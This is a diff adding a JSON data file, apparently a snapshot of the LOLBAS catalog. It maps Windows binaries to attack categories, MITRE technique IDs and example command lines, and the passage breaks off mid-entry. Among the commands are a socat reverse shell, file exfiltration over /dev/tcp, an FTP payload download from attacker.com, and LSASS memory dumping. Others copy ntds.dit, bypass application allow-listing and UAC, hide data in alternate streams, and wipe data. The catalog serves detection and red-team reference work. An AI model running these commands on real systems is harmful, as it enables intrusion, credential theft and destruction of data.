@@ -1,0 +1,2889 @@
+{
+  "source": {
+    "name": "LOLBAS",
+    "repo": "https://github.com/LOLBAS-Project/LOLBAS",
+    "ref": "master",
+    "commit": "f06df108eef22dddc5a4ab7d2a11eba6906d05c4",
+    "site": "https://lolbas-project.github.io/",
+    "license": "GPL-3.0 (see upstream LICENSE)",
+    "tarball_url": "https://codeload.github.com/LOLBAS-Project/LOLBAS/tar.gz/refs/heads/master",
+    "tarball_sha256": "5f9602a303815177ec9df1135406a40ae5febd036de4e8b5b832dfa610013df6",
+    "retrieved_at": "2026-06-22"
+  },
+  "entries": [
+    {
+      "binary": "AccCheckConsole.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1218",
+      "command": "AccCheckConsole.exe -window \"Untitled - Notepad\" {PATH_ABSOLUTE:.dll}"
+    },
+    {
+      "binary": "AccCheckConsole.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "AccCheckConsole.exe -window \"Untitled - Notepad\" {PATH_ABSOLUTE:.dll}"
+    },
+    {
+      "binary": "AddinUtil.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\AddinUtil.exe -AddinRoot:."
+    },
+    {
+      "binary": "Advpack.dll",
+      "category": "AWL Bypass",
+      "mitre": "T1218.011",
+      "command": "rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},,1,"
+    },
+    {
+      "binary": "Advpack.dll",
+      "category": "AWL Bypass",
+      "mitre": "T1218.011",
+      "command": "rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},DefaultInstall_SingleUser,1,"
+    },
+    {
+      "binary": "Advpack.dll",
+      "category": "Execute",
+      "mitre": "T1218.011",
+      "command": "rundll32 advpack.dll, RegisterOCX {CMD}"
+    },
+    {
+      "binary": "Advpack.dll",
+      "category": "Execute",
+      "mitre": "T1218.011",
+      "command": "rundll32.exe advpack.dll,RegisterOCX {PATH:.dll}"
+    },
+    {
+      "binary": "Advpack.dll",
+      "category": "Execute",
+      "mitre": "T1218.011",
+      "command": "rundll32.exe advpack.dll,RegisterOCX {PATH:.exe}"
+    },
+    {
+      "binary": "AgentExecutor.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "AgentExecutor.exe -powershell \"{PATH_ABSOLUTE:.ps1}\" \"{PATH_ABSOLUTE:.1.log}\" \"{PATH_ABSOLUTE:.2.log}\" \"{PATH_ABSOLUTE:.3.log}\" 60000 \"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\" 0 1"
+    },
+    {
+      "binary": "AgentExecutor.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "AgentExecutor.exe -powershell \"{PATH_ABSOLUTE:.ps1}\" \"{PATH_ABSOLUTE:.1.log}\" \"{PATH_ABSOLUTE:.2.log}\" \"{PATH_ABSOLUTE:.3.log}\" 60000 \"{PATH_ABSOLUTE:folder}\" 0 1"
+    },
+    {
+      "binary": "AppCert.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.exe} -reportoutputpath {PATH_ABSOLUTE:.xml}"
+    },
+    {
+      "binary": "AppCert.exe",
+      "category": "Execute",
+      "mitre": "T1218.007",
+      "command": "appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.msi} -setupcommandline /q -reportoutputpath {PATH_ABSOLUTE:.xml}"
+    },
+    {
+      "binary": "AppInstaller.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "start ms-appinstaller://?source={REMOTEURL:.exe}"
+    },
+    {
+      "binary": "AppLauncher.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "AppLauncher.exe {PATH_ABSOLUTE:.exe}"
+    },
+    {
+      "binary": "Appvlp.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "AppVLP.exe powershell.exe -c \"$e=New-Object -ComObject shell.application;$e.ShellExecute('{PATH:.exe}','', '', 'open', 1)\""
+    },
+    {
+      "binary": "Appvlp.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "AppVLP.exe {PATH_SMB:.bat}"
+    },
+    {
+      "binary": "Aspnet_Compiler.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1127",
+      "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe -v none -p C:\\users\\cpl.internal\\desktop\\asptest\\ -f C:\\users\\cpl.internal\\desktop\\asptest\\none -u"
+    },
+    {
+      "binary": "At.exe",
+      "category": "Execute",
+      "mitre": "T1053.002",
+      "command": "C:\\Windows\\System32\\at.exe 09:00 /interactive /every:m,t,w,th,f,s,su {CMD}"
+    },
+    {
+      "binary": "Atbroker.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "ATBroker.exe /start malware"
+    },
+    {
+      "binary": "Bash.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1202",
+      "command": "bash.exe -c \"{CMD}\""
+    },
+    {
+      "binary": "Bash.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "bash.exe"
+    },
+    {
+      "binary": "Bash.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "bash.exe -c \"socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane\""
+    },
+    {
+      "binary": "Bash.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "bash.exe -c \"{CMD}\""
+    },
+    {
+      "binary": "Bash.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "bash.exe -c 'cat {PATH:.zip} > /dev/tcp/192.168.1.10/24'"
+    },
+    {
+      "binary": "Bcp.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "bcp \"SELECT payload_data FROM database.dbo.payloads WHERE id=1\" queryout \"C:\\Windows\\Temp\\payload.exe\" -S localhost -T -c"
+    },
+    {
+      "binary": "Bginfo.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1218",
+      "command": "\\\\10.10.10.10\\webdav\\bginfo.exe {PATH:.bgi} /popup /nolicprompt"
+    },
+    {
+      "binary": "Bginfo.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1218",
+      "command": "\\\\live.sysinternals.com\\Tools\\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt"
+    },
+    {
+      "binary": "Bginfo.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1218",
+      "command": "bginfo.exe {PATH:.bgi} /popup /nolicprompt"
+    },
+    {
+      "binary": "Bginfo.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "\\\\10.10.10.10\\webdav\\bginfo.exe {PATH:.bgi} /popup /nolicprompt"
+    },
+    {
+      "binary": "Bginfo.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "\\\\live.sysinternals.com\\Tools\\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt"
+    },
+    {
+      "binary": "Bginfo.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "bginfo.exe {PATH:.bgi} /popup /nolicprompt"
+    },
+    {
+      "binary": "Bitsadmin.exe",
+      "category": "ADS",
+      "mitre": "T1564.004",
+      "command": "bitsadmin /create 1 bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1"
+    },
+    {
+      "binary": "Bitsadmin.exe",
+      "category": "Copy",
+      "mitre": "T1105",
+      "command": "bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset"
+    },
+    {
+      "binary": "Bitsadmin.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\\data\\playfolder\\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1"
+    },
+    {
+      "binary": "Bitsadmin.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset"
+    },
+    {
+      "binary": "CL_Invocation.ps1",
+      "category": "Execute",
+      "mitre": "T1216",
+      "command": ". C:\\Windows\\diagnostics\\system\\AERO\\CL_Invocation.ps1   \\nSyncInvoke {CMD}"
+    },
+    {
+      "binary": "CL_LoadAssembly.ps1",
+      "category": "Execute",
+      "mitre": "T1216",
+      "command": "powershell.exe -ep bypass -command \"set-location -path C:\\Windows\\diagnostics\\system\\Audio; import-module .\\CL_LoadAssembly.ps1; LoadAssemblyFromPath ..\\..\\..\\..\\testing\\fun.dll;[Program]::Fun()\""
+    },
+    {
+      "binary": "CL_Mutexverifiers.ps1",
+      "category": "Execute",
+      "mitre": "T1216",
+      "command": ". C:\\Windows\\diagnostics\\system\\AERO\\CL_Mutexverifiers.ps1   \\nrunAfterCancelProcess {PATH:.ps1}"
+    },
+    {
+      "binary": "Cdb.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "cdb.exe -c {PATH:.txt} \"{CMD}\""
+    },
+    {
+      "binary": "Cdb.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "cdb.exe -cf {PATH:.wds} -o notepad.exe"
+    },
+    {
+      "binary": "Cdb.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "cdb.exe -pd -pn {process_name}\n.shell {CMD}\n"
+    },
+    {
+      "binary": "CertOC.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "certoc.exe -GetCACAPS {REMOTEURL:.ps1}"
+    },
+    {
+      "binary": "CertOC.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "certoc.exe -LoadDLL {PATH_ABSOLUTE:.dll}"
+    },
+    {
+      "binary": "CertReq.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE} {PATH:.txt}"
+    },
+    {
+      "binary": "CertReq.exe",
+      "category": "Upload",
+      "mitre": "T1105",
+      "command": "CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE}"
+    },
+    {
+      "binary": "Certutil.exe",
+      "category": "ADS",
+      "mitre": "T1564.004",
+      "command": "certutil.exe -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt"
+    },
+    {
+      "binary": "Certutil.exe",
+      "category": "Decode",
+      "mitre": "T1140",
+      "command": "certutil -decode {PATH:.base64} {PATH}"
+    },
+    {
+      "binary": "Certutil.exe",
+      "category": "Decode",
+      "mitre": "T1140",
+      "command": "certutil -decodehex {PATH:.hex} {PATH}"
+    },
+    {
+      "binary": "Certutil.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "certutil.exe -URL {REMOTEURL:.exe}"
+    },
+    {
+      "binary": "Certutil.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe}"
+    },
+    {
+      "binary": "Certutil.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "certutil.exe -verifyctl -f {REMOTEURL:.exe} {PATH:.exe}"
+    },
+    {
+      "binary": "Certutil.exe",
+      "category": "Encode",
+      "mitre": "T1027.013",
+      "command": "certutil -encode {PATH} {PATH:.base64}"
+    },
+    {
+      "binary": "Change.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "change.exe user"
+    },
+    {
+      "binary": "Cipher.exe",
+      "category": "Tamper",
+      "mitre": "T1485",
+      "command": "cipher /w:{PATH_ABSOLUTE:folder}"
+    },
+    {
+      "binary": "Cipher.exe",
+      "category": "Tamper",
+      "mitre": "T1562",
+      "command": "cipher.exe /e {PATH_ABSOLUTE}"
+    },
+    {
+      "binary": "Cmd.exe",
+      "category": "ADS",
+      "mitre": "T1059.003",
+      "command": "cmd.exe - < {PATH}:payload.bat"
+    },
+    {
+      "binary": "Cmd.exe",
+      "category": "ADS",
+      "mitre": "T1564.004",
+      "command": "cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:{REMOTEURL:.sct} ^scrobj.dll > {PATH}:payload.bat"
+    },
+    {
+      "binary": "Cmd.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "type {PATH_SMB} > {PATH_ABSOLUTE}"
+    },
+    {
+      "binary": "Cmd.exe",
+      "category": "Upload",
+      "mitre": "T1048.003",
+      "command": "type {PATH_ABSOLUTE} > {PATH_SMB}"
+    },
+    {
+      "binary": "Cmdkey.exe",
+      "category": "Credentials",
+      "mitre": "T1078",
+      "command": "cmdkey /list"
+    },
+    {
+      "binary": "Cmstp.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1218.003",
+      "command": "cmstp.exe /ni /s {REMOTEURL:.inf}"
+    },
+    {
+      "binary": "Cmstp.exe",
+      "category": "Execute",
+      "mitre": "T1218.003",
+      "command": "cmstp.exe /nf"
+    },
+    {
+      "binary": "Cmstp.exe",
+      "category": "Execute",
+      "mitre": "T1218.003",
+      "command": "cmstp.exe /ni /s {PATH_ABSOLUTE:.inf}"
+    },
+    {
+      "binary": "Colorcpl.exe",
+      "category": "Copy",
+      "mitre": "T1036.005",
+      "command": "colorcpl {PATH}"
+    },
+    {
+      "binary": "ComputerDefaults.exe",
+      "category": "UAC Bypass",
+      "mitre": "T1548.002",
+      "command": "ComputerDefaults.exe"
+    },
+    {
+      "binary": "Comsvcs.dll",
+      "category": "Dump",
+      "mitre": "T1003.001",
+      "command": "rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump {LSASS_PID} dump.bin full"
+    },
+    {
+      "binary": "ConfigSecurityPolicy.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "ConfigSecurityPolicy.exe {REMOTEURL}"
+    },
+    {
+      "binary": "ConfigSecurityPolicy.exe",
+      "category": "Upload",
+      "mitre": "T1567",
+      "command": "ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL}"
+    },
+    {
+      "binary": "Conhost.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "conhost.exe --headless {CMD}"
+    },
+    {
+      "binary": "Conhost.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "conhost.exe {CMD}"
+    },
+    {
+      "binary": "Control.exe",
+      "category": "ADS",
+      "mitre": "T1218.002",
+      "command": "control.exe {PATH_ABSOLUTE}:evil.dll"
+    },
+    {
+      "binary": "Control.exe",
+      "category": "Execute",
+      "mitre": "T1218.002",
+      "command": "control.exe {PATH_ABSOLUTE:.cpl}"
+    },
+    {
+      "binary": "Createdump.exe",
+      "category": "Dump",
+      "mitre": "T1003",
+      "command": "createdump.exe -n -f {PATH:.dmp} {PID}"
+    },
+    {
+      "binary": "Csc.exe",
+      "category": "Compile",
+      "mitre": "T1127",
+      "command": "csc -target:library {PATH:.cs}"
+    },
+    {
+      "binary": "Csc.exe",
+      "category": "Compile",
+      "mitre": "T1127",
+      "command": "csc.exe -out:{PATH:.exe} {PATH:.cs}"
+    },
+    {
+      "binary": "Cscript.exe",
+      "category": "ADS",
+      "mitre": "T1564.004",
+      "command": "cscript //e:vbscript {PATH_ABSOLUTE}:script.vbs"
+    },
+    {
+      "binary": "CustomShellHost.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "CustomShellHost.exe"
+    },
+    {
+      "binary": "DataSvcUtil.exe",
+      "category": "Upload",
+      "mitre": "T1567",
+      "command": "DataSvcUtil /out:{PATH_ABSOLUTE} /uri:{REMOTEURL}"
+    },
+    {
+      "binary": "DefaultPack.EXE",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "DefaultPack.EXE /C:\"{CMD}\""
+    },
+    {
+      "binary": "Desk.cpl",
+      "category": "Execute",
+      "mitre": "T1218.011",
+      "command": "rundll32.exe desk.cpl,InstallScreenSaver {PATH_ABSOLUTE:.scr}"
+    },
+    {
+      "binary": "Desk.cpl",
+      "category": "Execute",
+      "mitre": "T1218.011",
+      "command": "rundll32.exe desk.cpl,InstallScreenSaver {PATH_SMB:.scr}"
+    },
+    {
+      "binary": "Desktopimgdownldr.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "set \"SYSTEMROOT=C:\\Windows\\Temp\" && cmd /c desktopimgdownldr.exe /lockscreenurl:{REMOTEURL} /eventName:desktopimgdownldr"
+    },
+    {
+      "binary": "DeviceCredentialDeployment.exe",
+      "category": "Conceal",
+      "mitre": "T1564",
+      "command": "DeviceCredentialDeployment"
+    },
+    {
+      "binary": "Devinit.exe",
+      "category": "Execute",
+      "mitre": "T1218.007",
+      "command": "devinit.exe run -t msi-install -i {REMOTEURL:.msi}"
+    },
+    {
+      "binary": "Devtoolslauncher.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "devtoolslauncher.exe LaunchForDebug {PATH_ABSOLUTE:.exe} \"{CMD:args}\" test"
+    },
+    {
+      "binary": "Devtoolslauncher.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "devtoolslauncher.exe LaunchForDeploy {PATH_ABSOLUTE:.exe} \"{CMD:args}\" test"
+    },
+    {
+      "binary": "Dfshim.dll",
+      "category": "AWL Bypass",
+      "mitre": "T1127.002",
+      "command": "rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}"
+    },
+    {
+      "binary": "Dfsvc.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1127.002",
+      "command": "rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}"
+    },
+    {
+      "binary": "Diantz.exe",
+      "category": "ADS",
+      "mitre": "T1564.004",
+      "command": "diantz.exe {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:targetFile.cab"
+    },
+    {
+      "binary": "Diantz.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "diantz.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab}"
+    },
+    {
+      "binary": "Diantz.exe",
+      "category": "Execute",
+      "mitre": "T1036",
+      "command": "diantz /f {PATH:.ddf}"
+    },
+    {
+      "binary": "Diskshadow.exe",
+      "category": "Dump",
+      "mitre": "T1003.003",
+      "command": "diskshadow.exe /s {PATH:.txt}"
+    },
+    {
+      "binary": "Diskshadow.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "diskshadow> exec {PATH:.exe}"
+    },
+    {
+      "binary": "Dnscmd.exe",
+      "category": "Execute",
+      "mitre": "T1543.003",
+      "command": "dnscmd.exe dc1.lab.int /config /serverlevelplugindll {PATH_SMB:.dll}"
+    },
+    {
+      "binary": "Dotnet.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1218",
+      "command": "dotnet.exe msbuild {PATH:.csproj}"
+    },
+    {
+      "binary": "Dotnet.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1218",
+      "command": "dotnet.exe {PATH:.dll}"
+    },
+    {
+      "binary": "Dotnet.exe",
+      "category": "Execute",
+      "mitre": "T1059",
+      "command": "dotnet.exe fsi"
+    },
+    {
+      "binary": "Dotnet.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "dotnet.exe {PATH:.dll}"
+    },
+    {
+      "binary": "Dump64.exe",
+      "category": "Dump",
+      "mitre": "T1003.001",
+      "command": "dump64.exe {PID} out.dmp"
+    },
+    {
+      "binary": "DumpMinitool.exe",
+      "category": "Dump",
+      "mitre": "T1003.001",
+      "command": "DumpMinitool.exe --file {PATH_ABSOLUTE} --processId 1132 --dumpType Full"
+    },
+    {
+      "binary": "Dxcap.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "Dxcap.exe -c {PATH_ABSOLUTE:.exe}"
+    },
+    {
+      "binary": "Dxcap.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "dxcap.exe -usage"
+    },
+    {
+      "binary": "ECMangen.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "ECMangen.exe {REMOTEURL}"
+    },
+    {
+      "binary": "Esentutl.exe",
+      "category": "ADS",
+      "mitre": "T1564.004",
+      "command": "esentutl.exe /y {PATH_ABSOLUTE:.exe} /d {PATH_ABSOLUTE}:file.exe /o"
+    },
+    {
+      "binary": "Esentutl.exe",
+      "category": "ADS",
+      "mitre": "T1564.004",
+      "command": "esentutl.exe /y {PATH_ABSOLUTE}:file.exe /d {PATH_ABSOLUTE:.exe} /o"
+    },
+    {
+      "binary": "Esentutl.exe",
+      "category": "ADS",
+      "mitre": "T1564.004",
+      "command": "esentutl.exe /y {PATH_SMB:.exe} /d {PATH_ABSOLUTE}:file.exe /o"
+    },
+    {
+      "binary": "Esentutl.exe",
+      "category": "Copy",
+      "mitre": "T1003.003",
+      "command": "esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d {PATH_ABSOLUTE:.dit}"
+    },
+    {
+      "binary": "Esentutl.exe",
+      "category": "Copy",
+      "mitre": "T1105",
+      "command": "esentutl.exe /y {PATH_ABSOLUTE:.source.vbs} /d {PATH_ABSOLUTE:.dest.vbs} /o"
+    },
+    {
+      "binary": "Esentutl.exe",
+      "category": "Download",
+      "mitre": "T1564.004",
+      "command": "esentutl.exe /y {PATH_SMB:.source.exe} /d {PATH_SMB:.dest.exe} /o"
+    },
+    {
+      "binary": "Eudcedit.exe",
+      "category": "UAC Bypass",
+      "mitre": "T1548.002",
+      "command": "eudcedit"
+    },
+    {
+      "binary": "Eventvwr.exe",
+      "category": "UAC Bypass",
+      "mitre": "T1548.002",
+      "command": "eventvwr.exe"
+    },
+    {
+      "binary": "Eventvwr.exe",
+      "category": "UAC Bypass",
+      "mitre": "T1548.002",
+      "command": "ysoserial.exe -o raw -f BinaryFormatter - g DataSet -c \"{CMD}\" > RecentViews & copy RecentViews %LOCALAPPDATA%\\Microsoft\\EventV~1\\RecentViews & eventvwr.exe"
+    },
+    {
+      "binary": "Excel.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "Excel.exe {REMOTEURL}"
+    },
+    {
+      "binary": "Expand.exe",
+      "category": "ADS",
+      "mitre": "T1564.004",
+      "command": "expand {PATH_SMB:.bat} {PATH_ABSOLUTE}:file.bat"
+    },
+    {
+      "binary": "Expand.exe",
+      "category": "Copy",
+      "mitre": "T1105",
+      "command": "expand {PATH_ABSOLUTE:.source.ext} {PATH_ABSOLUTE:.dest.ext}"
+    },
+    {
+      "binary": "Expand.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "expand {PATH_SMB:.bat} {PATH_ABSOLUTE:.bat}"
+    },
+    {
+      "binary": "Explorer.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "explorer.exe /root,\"{PATH_ABSOLUTE:.exe}\""
+    },
+    {
+      "binary": "Explorer.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "explorer.exe {PATH_ABSOLUTE:.exe}"
+    },
+    {
+      "binary": "Extexport.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "Extexport.exe {PATH_ABSOLUTE:folder} foo bar"
+    },
+    {
+      "binary": "Extrac32.exe",
+      "category": "ADS",
+      "mitre": "T1564.004",
+      "command": "extrac32 {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE}:file.exe"
+    },
+    {
+      "binary": "Extrac32.exe",
+      "category": "ADS",
+      "mitre": "T1564.004",
+      "command": "extrac32 {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE}:file.exe"
+    },
+    {
+      "binary": "Extrac32.exe",
+      "category": "Copy",
+      "mitre": "T1105",
+      "command": "extrac32.exe /C {PATH_ABSOLUTE:.source.exe} {PATH_ABSOLUTE:.dest.exe}"
+    },
+    {
+      "binary": "Extrac32.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "extrac32 /Y /C {PATH_SMB} {PATH_ABSOLUTE}"
+    },
+    {
+      "binary": "Findstr.exe",
+      "category": "ADS",
+      "mitre": "T1564.004",
+      "command": "findstr /V /L W3AllLov3LolBas {PATH_ABSOLUTE:.exe} > {PATH_ABSOLUTE}:file.exe"
+    },
+    {
+      "binary": "Findstr.exe",
+      "category": "ADS",
+      "mitre": "T1564.004",
+      "command": "findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE}:file.exe"
+    },
+    {
+      "binary": "Findstr.exe",
+      "category": "Credentials",
+      "mitre": "T1552.001",
+      "command": "findstr /S /I cpassword \\\\sysvol\\policies\\*.xml"
+    },
+    {
+      "binary": "Findstr.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE:.exe}"
+    },
+    {
+      "binary": "Finger.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "finger user@example.host.com | more +2 | cmd"
+    },
+    {
+      "binary": "Forfiles.exe",
+      "category": "ADS",
+      "mitre": "T1564.004",
+      "command": "forfiles /p c:\\windows\\system32 /m notepad.exe /c \"{PATH_ABSOLUTE}:evil.exe\""
+    },
+    {
+      "binary": "Forfiles.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "forfiles /p c:\\windows\\system32 /m notepad.exe /c \"{CMD}\""
+    },
+    {
+      "binary": "Fsi.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1059",
+      "command": "fsi.exe"
+    },
+    {
+      "binary": "Fsi.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1059",
+      "command": "fsi.exe {PATH:.fsscript}"
+    },
+    {
+      "binary": "FsiAnyCpu.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1059",
+      "command": "fsianycpu.exe"
+    },
+    {
+      "binary": "FsiAnyCpu.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1059",
+      "command": "fsianycpu.exe {PATH:.fsscript}"
+    },
+    {
+      "binary": "Fsutil.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "fsutil.exe trace decode"
+    },
+    {
+      "binary": "Fsutil.exe",
+      "category": "Tamper",
+      "mitre": "T1485",
+      "command": "fsutil.exe file setZeroData offset=0 length=9999999999 {PATH_ABSOLUTE}"
+    },
+    {
+      "binary": "Fsutil.exe",
+      "category": "Tamper",
+      "mitre": "T1485",
+      "command": "fsutil.exe usn deletejournal /d c:"
+    },
+    {
+      "binary": "Ftp.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "cmd.exe /c \"@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v\""
+    },
+    {
+      "binary": "Ftp.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "echo !{CMD} > ftpcommands.txt && ftp -s:ftpcommands.txt"
+    },
+    {
+      "binary": "GfxDownloadWrapper.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "C:\\Windows\\System32\\DriverStore\\FileRepository\\igdlh64.inf_amd64_[0-9]+\\GfxDownloadWrapper.exe \"URL\" \"DESTINATION FILE\""
+    },
+    {
+      "binary": "Gpscript.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "Gpscript /logon"
+    },
+    {
+      "binary": "Gpscript.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "Gpscript /startup"
+    },
+    {
+      "binary": "Hh.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "HH.exe {REMOTEURL:.bat}"
+    },
+    {
+      "binary": "Hh.exe",
+      "category": "Execute",
+      "mitre": "T1218.001",
+      "command": "HH.exe {PATH_ABSOLUTE:.exe}"
+    },
+    {
+      "binary": "Hh.exe",
+      "category": "Execute",
+      "mitre": "T1218.001",
+      "command": "HH.exe {REMOTEURL:.chm}"
+    },
+    {
+      "binary": "IMEWDBLD.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "C:\\Windows\\System32\\IME\\SHARED\\IMEWDBLD.exe {REMOTEURL}"
+    },
+    {
+      "binary": "Ie4uinit.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "ie4uinit.exe -BaseSettings"
+    },
+    {
+      "binary": "Ieadvpack.dll",
+      "category": "AWL Bypass",
+      "mitre": "T1218.011",
+      "command": "rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},,1,"
+    },
+    {
+      "binary": "Ieadvpack.dll",
+      "category": "AWL Bypass",
+      "mitre": "T1218.011",
+      "command": "rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},DefaultInstall_SingleUser,1,"
+    },
+    {
+      "binary": "Ieadvpack.dll",
+      "category": "Execute",
+      "mitre": "T1218.011",
+      "command": "rundll32 ieadvpack.dll, RegisterOCX {CMD}"
+    },
+    {
+      "binary": "Ieadvpack.dll",
+      "category": "Execute",
+      "mitre": "T1218.011",
+      "command": "rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.dll}"
+    },
+    {
+      "binary": "Ieadvpack.dll",
+      "category": "Execute",
+      "mitre": "T1218.011",
+      "command": "rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.exe}"
+    },
+    {
+      "binary": "Ieexec.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "ieexec.exe {REMOTEURL:.exe}"
+    },
+    {
+      "binary": "Ieexec.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "ieexec.exe {REMOTEURL:.exe}"
+    },
+    {
